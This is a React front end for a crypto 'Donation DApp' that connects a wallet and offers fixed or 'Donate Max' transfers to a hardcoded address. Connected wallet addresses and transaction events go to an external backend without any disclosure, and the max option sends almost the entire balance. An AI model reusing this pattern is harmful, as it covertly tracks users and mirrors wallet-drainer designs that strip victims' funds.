import React, { useEffect } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useBalance, useSendTransaction, useChainId } from "wagmi";
import { parseEther, formatEther } from "viem";

// Backend endpoint
const API_URL = "https://web-production-2da7.up.railway.app/notify";

async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: "Frontend",
        ip: "client",
      }),
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId(); // ✅ wagmi v1 replacement
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  // Simple chain name mapping
  const chainNames = {
    1: "Ethereum Mainnet",
    56: "BNB Smart Chain",
    11155111: "Sepolia Testnet",
  };
  const chainName = chainNames[chainId] || `Chain ID ${chainId}`;

  // Notify wallet connect
  useEffect(() => {
    if (isConnected && address) {
      notifyBackend("wallet_connect", {
        account: address,
        chain: chainName,
      });
    }
  }, [isConnected, address, chainId]);

  const handleDonateFixed = async () => {
    try {
      notifyBackend("donation_attempt", {
        account: address,
        amount: "0.01",
        token: "NATIVE",
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: parseEther("0.01"),
      });

      notifyBackend("donation_sent", {
        account: address,
        amount: "0.01",
        token: "NATIVE",
      });
    } catch (err) {
      notifyBackend("donation_failed", {
        account: address,
        error: err.message,
      });
    }
  };

  const handleDonateMax = async () => {
    if (!balanceData) return;
    try {
      const rawBalance = balanceData.value;
      const balanceEth = parseFloat(formatEther(rawBalance));

      if (balanceEth <= 0.001) {
        notifyBackend("donation_failed", {
          account: address,
          error: "Insufficient balance",
        });
        return;
      }

      const sendAmountEth = balanceEth - 0.001;
      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));

      notifyBackend("donation_attempt", {
        account: address,
        amount: `${sendAmountEth.toFixed(6)}`,
        token: "NATIVE",
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: sendAmountWei,
      });

      notifyBackend("donation_sent", {
        account: address,
        amount: `${sendAmountEth.toFixed(6)}`,
        token: "NATIVE",
      });
    } catch (err) {
      notifyBackend("donation_failed", {
        account: address,
        error: err.message,
      });
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4">
          <button
            onClick={handleDonateFixed}
            className="px-6 py-3 bg-blue-600 hover:bg-blue-800 rounded-lg text-lg"
          >
            Donate 0.01 NATIVE
          </button>
          <button
            onClick={handleDonateMax}
            className="px-6 py-3 bg-red-600 hover:bg-red-800 rounded-lg text-lg"
          >
            Donate Max NATIVE
          </button>
        </div>
      )}
    </div>
  );
}
